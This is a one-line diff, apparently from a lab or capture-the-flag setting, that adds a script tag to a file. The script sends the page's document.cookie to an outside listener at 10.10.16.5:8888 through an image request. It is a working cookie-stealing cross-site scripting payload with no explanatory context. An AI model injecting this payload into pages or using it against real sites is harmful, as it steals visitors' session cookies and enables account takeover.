@@ -1,0 +1,1 @@
+<script>new Image().src = "http://10.10.16.5:8888/log?cookie=" + document.cookie;</script>
